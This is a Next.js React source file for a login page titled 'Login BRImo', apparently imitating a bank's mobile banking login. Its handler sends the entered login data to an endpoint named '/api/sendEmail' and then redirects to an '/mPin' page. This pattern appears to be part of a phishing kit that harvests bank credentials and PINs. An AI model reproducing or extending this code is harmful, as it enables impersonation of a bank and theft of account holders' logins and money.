
import React from 'react'
import SiteImage from '../components/SiteImage'
import SiteTitle from '../components/SiteTitle'
import SiteForm from '../components/SiteForm'

import logo from "../public/login.jpg"
import { useRouter } from 'next/router'

function Login({host}) {
  const router = useRouter()

  const handleLogin = async (data) => {
    document.getElementById('btn').innerHTML = 'Loading...'
      try {
        
        const response = await fetch('/api/sendEmail', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'url': host
            },
            body: JSON.stringify(data)
        })

        const json = await response.json()
        
        if (json.status === 200) {
            document.getElementById('btn').innerHTML = 'Login'
            router.push('/mPin')
        } else{
            document.getElementById('btn').innerHTML = 'Login'
            console.log(json.error)
        }

      } catch (error) {
          document.getElementById('btn').innerHTML = 'Login'
          console.log(error.message);
      }
  }

  return (
    <div className="container">
      <SiteTitle title="Login BRImo"/>
      <div className='container-flex'>
        <SiteImage logo={logo}/>      
        <SiteForm jenis="login"
          btnClick={(data) => handleLogin(data)}
        />
      </div>
    </div>
  )
}

export async function getServerSideProps(context) {

  const host = context.req.headers.host
  
  return {
    props: {
      host
    },
  }
}

export default Login